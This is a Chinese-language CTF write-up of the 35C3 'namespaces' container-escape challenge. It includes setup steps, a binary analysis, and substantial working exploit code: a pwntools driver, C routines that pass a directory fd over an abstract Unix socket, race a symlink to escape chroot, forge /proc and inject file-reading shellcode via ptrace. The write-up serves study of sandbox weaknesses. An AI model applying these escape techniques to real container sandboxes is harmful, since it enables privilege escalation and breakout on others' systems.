---
title: 35C3CTF-namespace
categories: Container security
---

## 前置知识

### namespace的flag解释

- **mnt namespaces**，mount的结果不会影响其他mnt namespaces中的进程
- **cgroup namespaces**，cgroup用于限制进程对cpu等系统资源的使用
- **uts namespaces**，隔离hostname和NIS域名
- **ipc namespaces**，隔离消息队列、信号量和共享内存3钟进程间通信的方式，并不会限制其他的ipc通信
- **user namespaces**，同一个用户在不同的user namespaces中可以对应不同的uid，一个user namespaces中的普通用户甚至可以是另一个user namespaces中的root用户。此外，新建或加入一个user namespaces时，无论新的uid是多少，能够在这个user namespaces中获取到全部的capabilities，不过需要注意如果uid不为0的话执行execve等函数后capabilities会全部丢失掉
- **pid namespaces**，隔离进程的pid，创建新的pid namespaces后，外层的pid namespaces可以看到里面的进程，而里面的进程无法看到外面的进程
- **net namespaces**，隔离网络相关的资源，比如ip协议栈、路由表等等，此外它还会隔离unix域的abstract socket，这点在后面也会用到
- **time namespaces**, 隔离系统时间，进程在不同命名空间中可以看到不同的系统时间。

### socket AF_UNIX通信

- **pathname**，指的是用bind将socket绑定到一个具体的文件名上去，这里因为chroot的限制无法使用
- **unnamed**，没有用bind绑定的stream socket都是unnamed的，上面socketpair创建的也是。在这种两个进程分别创建socket的情况下是当作客户端去使用
- **abstract**，用bind将socket绑定到一个与文件系统无关的名字上去，由net namespaces进行隔离

## 题目部署

​	本题比较经典，网上描述漏洞成因的时候有几个文章，但是在自己复现的时候发现存在一些问题。首先对于题目环境来说可以通过[链接](https://github.com/LevitatingLion/ctf-writeups/tree/master/35c3ctf/pwn_namespaces)进行访问。之后利用下面这个命令来启用镜像

```bash
docker run --privileged -v /sys/fs/cgroup:/sys/fs/cgroup:rw -v /flag:/flag -p 1337:1337 namespace
```

​	需要注意我是用ubuntu 22.04的机器去复现的，但是在复现过程中发现，ubuntu使用的时cgroupv2，而这个环境复现的需要时发现如果使用v2版本会找不到cpu memery pids等文件夹，因此需要切换回v1版本，因此需要执行

```bash
vim /etc/default/grub
GRUB_CMDLINE_LINUX="cgroup_enable=memory swapaccount=0 systemd.unified_cgroup_hierarchy=0" 
```

​	之后使用下面命令就可以重新启动机器并且切换回v1版本

```bash
sudo update-grub
sudo reboot
```

​	执行成功后会显示如下信息

![1735395811009](images/namespace/1735395811009.jpg)

## 题目分析

​	首先就是对于题目中的Dockerfile进行分析，内容如下：

```dockerfile
FROM tsuro/nsjail
COPY challenge/namespaces /home/user/chal
#COPY tmpflag /flag
CMD /bin/sh -c "/usr/bin/setup_cgroups.sh && cp /flag /tmp/flag && chmod 400 /tmp/flag && chown user /tmp/flag && su user -c '/usr/bin/nsjail -Ml --port 1337 --chroot / -R /tmp/flag:/flag -T /tmp --proc_rw -U 0:1000:1 -U 1:100000:1 -G 0:1000:1 -G 1:100000:1 --keep_caps --cgroup_mem_max 209715200 --cgroup_pids_max 100 --cgroup_cpu_ms_per_sec 100 --rlimit_as max --rlimit_cpu max --rlimit_nofile max --rlimit_nproc max -- /usr/bin/stdbuf -i0 -o0 -e0 /usr/bin/maybe_pow.sh /home/user/chal'"
```

​	实际上可以看出就是利用了nsjail进行创建了一个虚拟环境来执行我们的namespaces文件，并且将docker的1000号用户(user)映射为了nsjail中的0号用户(root)，将docker中的10000号用户(nobody)映射为了nsjail中的1号用户(nobody)。并且把flag文件放到了tmp目录下，用docker中的user用户权限，也就是nsjail的root用户权限来进行执行。

![1735436713608](images/namespace/1735436713608.jpg)

​	接下来就是分析main函数，进入到main函数中发现本体并没有去掉符号表因此还是比较人性的，可以看到主要就是两个函数，start_sandbox和run_elf两个函数，通过用户输入选项来进行选择，之后便是先进入到start_sandbox函数里面

![1735436872947](images/namespace/1735436872947.jpg)

​	在函数内部，通过 socketpair 创建了一个双向管道，方便父进程与子进程之间进行通信。接着，利用 new_proc 创建子进程，并关闭不必要的文件描述符。首先，获取 ELF 文件，并通过 setgroups 等操作修改进程的特权和用户/组映射，以调整进程的权限和身份。随后，使用 chroot 命令将进程的根目录设置为 /tmp/chroot/*，从而隔离进程，避免访问其他文件系统中的数据。最后，子进程等待父进程关闭 setgroups 等权限，确保在执行 ELF 文件时无法修改或干扰其操作。

![1735437325702](images/namespace/1735437325702.jpg)

​	这里说明一下new_proc函数，他其实是调用了clone函数，其中的0x7E020000LLflag其实是下面的拆解

```c
clone syscall,0x7E020000=CLONE_NEWNS|CLONE_NEWCGROUP|CLONE_NEWUTS|CLONE_NEWIPC|CLONE_NEWUSER|CLONE_NEWPID|CLONE_NEWNET
```

​	之后便是run_elf这个函数，这里面功能比较简单，首先就是获取之前start_sandbox里面的沙盒，之后fork一个子进程，利用change_ns把子进程的namespace切换成和沙盒里面的环境一样的namespace中，之后执行。

![1735437995398](images/namespace/1735437995398.jpg)

​	进入到change_ns里面可以看到，首先就是一个循环，打开父进程的/proc/self/ns目录下的namespace，利用setns函数切换过去，并且对于pid namespace进行了特殊处理，原因就是pid命名空间比较特殊，当前进程的pid命名空间并不会改变，只有子进程的才会进入到pid namespace中

![1735438143643](images/namespace/1735438143643.jpg)

​	最后就是看一下NSS变量，其实就是一个数组，通过循环回按照顺序一次执行user, mnt, pid, uts, ipc, cgroup的namespace设置，通过这里就可以发现，少了net的namespcae设置，因此在namespace下的elf中程序可以和其他的namespace下的程序进行通信，也就是本题逃逸chroot的漏洞方法

![1735438406556](images/namespace/1735438406556.jpg)

​	自此本题的逻辑也就分析完了，其实由于符号表都在，所以其实可以很清楚的看出对应函数执行的逻辑，我们通过对应他net namespace的缺少限制，可以对其进一步的利用

## 漏洞利用

### chroot逃逸

​	漏洞利用的方法就是和我们之前所说的socket通信有关，首先需要了解到的是，在linux中有一些函数是带有at的api，他们可以通过一个文件描述符加基于该文件描述符对应文件的相对路径来获得最终的文件路径，而非传统上直接由调用者给出字符串参数指定，比如下面这几个

```c
int openat(int dirfd, const char *pathname, int flags);
int unlinkat(int dirfd, const char *pathname, int flags);
int symlinkat(const char *target, int newdirfd, const char *linkpath);
```

​	因此，如果我们在一个沙盒中的程序（比如root目录在/tmp/chroot/1）的程序，发送一个fd给另一个沙盒中的程序（root目录在/tmp/chroot/2）,那么我们就可以通过相对路径逃逸出chroot的限制，但是需要考虑的是如何发送一个fd给在不同namespace下的程序呢。这里需要注意的是，对于clone来说，会把fd一同复制给子进程，并且经过实验，如下代码可以看到，经过各种flag标志的namespace都不会影响fd的传递。

```C
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sched.h>
#include <fcntl.h>
#include <string.h>
#include <dirent.h>

#define STACK_SIZE (1024 * 1024)

int global_fd = -1;

int child_func(void *arg) {
    int fd;
    char buffer[128];
    

    fd = global_fd;
    
    if (chroot("namespace1") == -1) {
        perror("chroot failed");
        exit(EXIT_FAILURE);
    }
    
    DIR *dir = opendir("/");
    if (dir == NULL) {
        perror("[Child] Failed to open root directory");
        exit(EXIT_FAILURE);
    }
    
    struct dirent *entry;
    printf("[Child] Listing root directory contents:\n");
    while ((entry = readdir(dir)) != NULL) {
        printf("[Child] %s\n", entry->d_name);
    }
    closedir(dir);
    
    int bytes_read = read(fd, buffer, sizeof(buffer) - 1);
    if (bytes_read > 0) {
        buffer[bytes_read] = '\0';
        printf("[Child] Flag content: %s\n", buffer);
    } else {
        perror("[Child] Failed to read the flag file");
    }
    
    return 0;

}

int main() {
    char *stack;
    char *stack_top;
    pid_t pid;
    int flags = SIGCHLD;

    stack = malloc(STACK_SIZE);
    if (!stack) {
        perror("malloc");
        exit(EXIT_FAILURE);
    }
    stack_top = stack + STACK_SIZE;
    
    global_fd = open("flag", O_RDONLY);
    if (global_fd == -1) {
        perror("Failed to open flag file in parent");
        exit(EXIT_FAILURE);
    }
    
    pid = clone(child_func, stack_top, CLONE_NEWNS | CLONE_NEWCGROUP | CLONE_NEWUTS | CLONE_NEWIPC | CLONE_NEWUSER | CLONE_NEWPID | CLONE_NEWNET | flags, NULL);
    if (pid == -1) {
        perror("clone");
        exit(EXIT_FAILURE);
    }
    
    waitpid(pid, NULL, 0);
    
    close(global_fd);
    free(stack);
    
    return 0;

}
```

​	这里就引入了我们在背景知识中提到的socket AF_UNIX通信，它可以用来作为进程间通信的工具，他主要分为三种**pathname**，**unnamed**，**abstract**，这三种可以简单说一下，**pathname**是通过文件来实现进程间通信的，但是对于本题来说，由于namespace中设置了mnt namespace，所以不同沙盒中的进程是看不到共同的文件路径的中文件的，因此这个方法行不通，对于**unnamed**来说，主要是用来接受进程间通信的信息的可以用来接受后面fd的步骤，之后对于**abstract**来说，通过创建一个匿名文件来进行进程间通信，非常符合本题的要求，因此我们通过**abstract**来发送文件描述符给另一个沙盒程序，然后他用**unnamed**来接受文件描述符。

### 提权

​	为了成功读取 flag 文件并提升权限，我们需要仔细研究 namespace 设置的顺序，通常按照 **user**、**mnt**、**pid**、**uts**、**ipc** 和 **cgroup** 的顺序进行操作。在设置 pid namespace 时，通过 fork 创建子进程，子进程进入目标的 pid namespace，才能看到该沙盒内的进程，并进行后续操作。namespace 设置完毕后，再进行权限设置。此时，可以使用 ptrace 来监控 pid namespace 中的进程，检测到新的进程加入时，使用 ptrace 调试并修改其 rip 寄存器，使其指向预设的 shellcode，执行读取 flag 文件的操作，从而实现特权提升并获取 flag。

![1735447328412](images/namespace/1735447328412.jpg)

​	但是在写exp的时候发现一个问题也就是，linux中存在**capabilities**机制，在过去的 Linux 系统中，sudo 和 SUID（Set User ID）机制让普通用户可以执行 root 权限的操作，但这两者都会赋予普通用户完整的 root 权限，存在较大的安全风险。为了解决这个问题，Linux 从内核 2.2 开始引入了 **capabilities** 机制，将 root 权限细分为多个独立的能力，每个能力对应系统中特定的操作。通过这种方式，进程只会获得执行特定任务所需的权限，而无需赋予其完整的 root 权限。

**Capabilities** 机制 允许进程获得执行特定任务所需的权限，而不需要拥有 root 权限。普通用户通常没有 **capabilities**，而 root 用户拥有所有的 **capabilities**。当进程创建或加入新的 user namespace 时，无论其 UID 和 GID 如何变化，都会获得新 namespace 中的 root 权限和所有 **capabilities**。尽管如此，新的 user namespace 中的 root 用户仍然受到一些限制，例如无法访问不在该 namespace 中映射的文件。此外对于在使用**execve**执行用户输入的elf后将不具有任何的**capabilities**，因此也就没有办法直接使用ptrace对于其他进程进行修改rip的操作。

​	新建 user namespaces 本身并不需要任何特殊的 **capabilities**，因此可以通过创建新的 user namespace 获取所有 **capabilities**，从而执行特权操作。然而，chroot 后的进程无法创建新的 user namespaces，这一限制旨在防止 chroot 环境中的进程逃逸。通过这种机制，Linux 实现了对 root 权限的细粒度控制，既保证了安全性，又提供了灵活性。因此为了逃逸Chroot我们需要进行条件竞争，按照下述流程首先删除/c目录然后把/c目录指向/目录，之后c沙盒其实就是在根目录的环境了也就可以创建user namespace

1. **c沙盒start_sandbox创建/tmp/chroots/c**
2. **a沙盒中的进程检测到/tmp/chroots/c，将其替换为软链接**
3. **c沙盒chroot到/tmp/chroots/c**

​	逃逸后，我们可以通过在新的 user namespace 中创建命名空间并使用 ptrace 进行调试操作，但如果进程进入到新的 user namespace，它将无法访问之前的 pid namespace，因此也无法观测和修改沙盒中的进程。

​	为了解决这一问题，我们可以同时clone的时候加入 user namespace， pid namespace，但这会导致进程不再处于原有的 pid namespace 中，无法直接通过 ptrace 修改沙盒进程，即run_elf的进程只会setns到start_sandbox里面的父进程中，而这时我们可以有ptrace能力的是子进程，并且与父进程不在同一个pid中。此时，我们需要利用mnt namespace对 /proc 目录进行修改。具体而言，需要加入user namespace pid namespace 和 mnt namespace 三个标志，这样可以通过修改 /proc，并在子进程中将原本的 /proc 保存到其他地方，重新挂载一个空的 /proc。接着，我们可以在原先父进程的 pid namespace 位置创建一个符号链接，指向子进程的 pid namespace。

```
  Holding CAP_SYS_ADMIN within the user namespace that owns a process’s mount namespace allows that process to create bind mounts and mount the following types of filesystems:
  
  - /proc (since Linux 3.8)
  - /sys (since Linux 3.8)
  - devpts (since Linux 3.9)
  - tmpfs(5) (since Linux 3.9)
  - ramfs (since Linux 3.9)
  - mqueue (since Linux 3.9)
  - bpf (since Linux 4.4)
```

​	由于父子进程处于同一个目录下，子进程在 mnt namespace 中的挂载操作会自动传播到父进程，这样父进程的 /proc 将与子进程的 /proc 保持一致。最终，父进程会看到伪造后的 /proc，从而加入到子进程的 pid namespace 中，这时。这时，子进程便能够通过 ptrace 注入 shellcode，成功读取 /flag 文件，从而完成提权操作。

​	为了提高最终成功执行 ptrace 的概率，我们可以在伪造的 /proc 中将 uts namespace 设置为一个 FIFO 管道，这样当 run_elf 进程在此处阻塞时，CPU 将转而执行 start_sandbox 子进程中的 ptrace 操作。尽管这一额外步骤并非必需，但它可以增加成功的几率，从而使得 ptrace 成功执行。

​	此外借用[文章](https://liotree.github.io/2022/08/12/35c3ctf-Pwn-namespaces/)中提到的，有一个常见的误解是，ptrace 需要被跟踪的进程首先调用 ptrace(PTRACE_TRACEME, 0, 0, 0) 才能成功执行。但经过实验后发现，并非如此（否则类似 strace 的工具就无法追踪进程了）。虽然 man 文档中对于 PTRACE_TRACEME 的描述比较模糊，但在更详细的文档中可以找到解释：PTRACE_TRACEME 用于指示该进程将被其父进程跟踪，任何除 SIGKILL 之外的信号都会导致该进程停止，并通过 wait(2) 通知父进程。而且，当该进程之后调用 execve(2) 时，会发送 SIGTRAP 信号给进程，父进程有机会在新程序执行前获得控制。这是 ptrace 成功执行的关键步骤之一。当前文档中这段描述已经被去除，但其原始含义是十分重要的。

## exp脚本详解

```python
from pwn import *
import shutil
import os
import tempfile
import random
import string

context.binary = './namespaces'


def exploit():
    # compile all four binaries
    prepare_bins()

    global r
    r = remote('localhost', 1337)
    # r = process("./namespaces")
    
    r.recvuntil(b'> ')
    hook_recv(r)
    
    # start sandbox 0 and 1
    for _ in range(2):
        start_sandbox('sleep')
        r.recvuntil(b'[sleep]  Started sleep')
    
    # send fd in sandbox 0
    run_file(0, 'sendfd')
    r.recvuntil(b'[sendfd]  Accepting')
    
    # recv fd in sandbox 1, race creation of chroot for sandbox 2
    run_file(1, 'recvfd')
    r.recvuntil(b'[recvfd]  Starting race')
    
    # start sandbox 2, hope we win the race
    # inside sandbox 2, set a trap for the next process joining sandbox 2
    start_sandbox('escalate')
    r.recvuntil(b'[escalate]  Waiting for victim to join')
    
    # let a process join sandbox 2 to escalate to root
    run_file(2, 'sleep')
    
    r.recvuntil(b'DONE')


def start_sandbox(init):
    print()
    success("Starting sandbox: %s", init)

    r.sendline(b'1')
    send_elf(init)


def run_file(idx, elf):
    print()
    success("Running in sandbox #%d: %s", idx, elf)

    r.sendline(b'2')
    r.sendlineafter(b'which sandbox? ', str(idx).encode())
    send_elf(elf)


def send_elf(elf):
    elf = bins[elf]
    

    r.recvuntil(b"elf len? ")
    r.sendline(str(len(elf)).encode())
    
    r.recvuntil(b'data? ')
    with context.local(log_level='INFO'):
        r.send(elf)
    
    log.debug("Sent ELF file")


def prepare_bins():
    global bins
    bins = {}

    names = 'sleep sendfd recvfd escalate'.split()
    rand = ''.join(random.choice(string.ascii_letters) for _ in range(10))
    sc = shellcode()
    
    directory = tempfile.mkdtemp()
    
    for name in names:
        os.system('gcc -Wall -Wextra -Wno-unused-function -O3 -static -m64 -o %s/bin binaries.c -DMAIN=%s -DRAND=%s -DSHELLCODE=%s' %
                  (directory, name, rand, sc))
        bins[name] = read(directory + '/bin')
    
    shutil.rmtree(directory)


def shellcode():
    sc = shellcraft.echo('[shellcode]  FLAG: ') + shellcraft.cat('/flag') + \
        shellcraft.echo('[shellcode]  DONE') + shellcraft.exit(0)

    sc = b'\x90' * 16 + asm(sc)
    sc = b'\x90' * (8 - (len(sc) % 8)) + sc
    assert len(sc) % 8 == 0
    
    print()
    print("Shellcode:")
    print(hexdump(sc))
    print()
    
    sc = ','.join(map(str, unpack_many(sc, 8)))
    return sc


def hook_recv(r):
    old_recv = r.recv_raw

    def new_recv(*args, **kwargs):
        ret = old_recv(*args, **kwargs)
    
        for line in ret.splitlines():
            if b'[' in line:
                print(line[line.index(b'['):])
    
        return ret
    
    r.recv_raw = new_recv

if __name__ == '__main__':
    exploit()
```

​	首先介绍一下exp这个脚本，他主要的工作便是编译binaries.c脚本，生成不同的exp发送给容器中，然后根据对应顺序执行，并且生成了对应的shellcode也一同提供给exp中，原仓库中的脚本本来时python2的我这里进行简单的修改。

​	之后便是对于binaries.c的文件进行详细的阐述，首先也就是最简单的do_sleep函数，这里十分简单就是sleep，通过sleep创建两个sandbox方便后面利用run_elf来进行chroot逃逸。

```C
static void do_sleep(void) {
    while (1)
        sleep(1);
}
```

​	之后就是do_sendfd，这里其实就是利用了之前说的**abstract** socket进行进程之间的通信，然后发送fd信息给另一个进程

```C
static void do_sendfd(void) {
    info("Opening fd");
    int fd = CHECK_CALL(open, "/", 0);

    setup_socket_and_send_fd(fd);
    close(fd);

}

static void setup_socket_and_send_fd(int fd) {
    int sock;
    struct sockaddr_un addr;
    socklen_t addrlen;
    create_socket(&sock, &addr, &addrlen);

    info("Binding");
    CHECK_CALL(bind, sock, &addr, addrlen);

    info("Listening");
    CHECK_CALL(listen, sock, 8);

    info("Accepting");
    int conn = CHECK_CALL(accept, sock, NULL, NULL);

    send_fd(conn, fd);

    close(conn);
    close(sock);
}

static void create_socket(int *sock, struct sockaddr_un *addr, socklen_t *addrlen) {
    info("Creating socket");
    *sock = CHECK_CALL(socket, AF_UNIX, SOCK_STREAM, 0);

    info("Creating addr");
    memset(addr, 0, sizeof *addr);
    addr->sun_family = AF_UNIX;
    strncpy(addr->sun_path, "@" STR(RAND), sizeof addr->sun_path - 1);
    *addrlen = offsetof(struct sockaddr_un, sun_path) + strlen(addr->sun_path) + 1;
    addr->sun_path[0] = 0;
}
```

​	同理do_recvfd也是类似，这里我们之前讲述原理的时候也做过实验，fd是可以在不同namespace中传递的，因此这里按照之前所说的原理，首先不断循环检测../2文件夹是否存在，如果存在说明有了新的sandbox加入，然后就把他删除，之后通过symlinkat命令，把这个文件夹指向根目录

```C
static void do_recvfd(void) {
    int fd = setup_socket_and_recv_fd();

    info("Starting race");
    while (unlinkat(fd, "../2", AT_REMOVEDIR))
        ;

    CHECK_CALL(symlinkat, "/", fd, "../2");
    info("Race done");

    close(fd);
}

static int setup_socket_and_recv_fd(void) {
    int sock;
    struct sockaddr_un addr;
    socklen_t addrlen;
    create_socket(&sock, &addr, &addrlen);

    info("Connecting");
    int conn = CHECK_CALL(connect, sock, &addr, addrlen);

    int fd = recv_fd(conn);

    close(conn);
    return fd;
}

static int recv_fd(int conn) {
    info("Preparing for receive");
    int fd;

    char io_buf[1] = {0};
    struct iovec io = {.iov_base = io_buf, .iov_len = sizeof io_buf};
    
    union {
        char buf[CMSG_SPACE(sizeof fd)];
        struct cmsghdr align;
    } u;
    memset(&u, 0, sizeof u);
    
    struct msghdr msg = {0};
    msg.msg_iov = &io;
    msg.msg_iovlen = 1;
    msg.msg_control = u.buf;
    msg.msg_controllen = sizeof u.buf;
    
    info("Receiving fd");
    CHECK_CALL(recvmsg, conn, &msg, 0);
    
    info("Extracting fd");
    struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
    memcpy(&fd, CMSG_DATA(cmsg), sizeof fd);
    return fd;

}
```

​	之后便是最重要的逃逸部分代码，这里只放一些关键代码，首先先检测是否可以访问/proc文件夹，也就是看一下是否逃逸成功到/目录，之后创建子进程，并且通过set_trap_for_join来进行mnt操作，首先就是把proc放到一个新的目录下，并且创建一个新的/proc目录，让新的/proc/父进程pid/ns/pid指向原来子进程的pid namespace，这样后面run_elf的时候就会和子进程一个pid namespace了，之后就是把uts namespace创建成fifo用来阻塞，提高成功率，之后就是不断的利用ptrace进行检测是否有新的进程加入，这里需要注意的是因为创建的是一个新进程，所以这里直接检测pid为2就可以了，之后注入shellcode

```C
static void do_escalate(void) {
    info("Checking that we won the race");
    CHECK_CALL(access, "/proc", F_OK);

    int init = get_cur_pid();
    info("Init pid: %d", init);
    
    new_namespaces();
    
    info("Forking");
    if (CHECK_CALL(fork)) {
        info("Parent done");
        do_sleep();
    }
    info("Child started");
    
    int child = get_cur_pid();
    info("Child pid: %d", child);
    
    set_trap_for_join(init, child);
    
    info("Waiting for victim to join");
    while (ptrace(PTRACE_ATTACH, 2, NULL, NULL))
        ;
    info("Attached to victim");
    CHECK_CALL(waitpid, 2, NULL, 0);
    
    info("Reading rip");
    struct user_regs_struct regs = {0};
    xptrace(PTRACE_GETREGS, 2, 0, (uintptr_t)&regs);
    
    info("Writing shellcode to %p", regs.rip);
    uint8_t shellcode[] = {SHELLCODE};
    ptrace_write(2, regs.rip, shellcode, sizeof shellcode);
    
    info("Detaching");
    xptrace(PTRACE_DETACH, 2, 0, 0);
    
    info("Opening fifo");
    DECL_STR(fifo, "/proc/%d/ns/uts", init)
    CHECK_CALL(open, fifo, O_WRONLY);
    
    do_sleep();

}

static void set_trap_for_join(int init_pid, int child_pid) {
    makedir("/tmp/oldproc_" STR(RAND));
    bindmount("/proc", "/tmp/oldproc_" STR(RAND));
    makedir("/tmp/newproc_" STR(RAND));
    bindmount("/tmp/newproc_" STR(RAND), "/proc");

    DECL_STR(dir1, "/proc/%d", init_pid)
    makedir(dir1);
    DECL_STR(dir2, "/proc/%d/ns", init_pid)
    makedir(dir2);

    DECL_STR(linkpath, "/proc/%d/ns/pid", init_pid)
    DECL_STR(target, "/tmp/oldproc_" STR(RAND) "/%d/ns/pid", child_pid)
    info("Linking pid ns \"%s\" -> \"%s\"", linkpath, target);
    CHECK_CALL(symlink, target, linkpath);

    DECL_STR(fifo, "/proc/%d/ns/uts", init_pid)
    info("Creating fifo \"%s\"", fifo);
    CHECK_CALL(mkfifo, fifo, 0755);
}
```

​	自此代码的逻辑就分析完了，这里贴一下简单的执行流程，根据这个流程执行最终就会把sandbox2的进程读取flag并且输出

```
[+] Starting sandbox: sleep
[+] Starting sandbox: sleep
[+] Running in sandbox #0: sendfd
[+] Running in sandbox #1: recvfd
[+] Starting sandbox: escalate
[+] Running in sandbox #2: sleep
```

​	由于篇幅原因，需要exp的可以直接访问[链接](https://github.com/LevitatingLion/ctf-writeups/tree/master/35c3ctf/pwn_namespaces)来进行获取

## 总结

​	由于这个是我复现的容器逃逸的第一个题目，其中很多思想之前并没有接触过，因此复现的过程也比较详细，中间也踩过不少的坑，通过这个文章可以很清楚的复现对应赛题，感觉通过这个题目对于容器有了进一步的了解，希望可以通过后面的学习不断的加深对于容器以及docker原理的学习和漏洞复现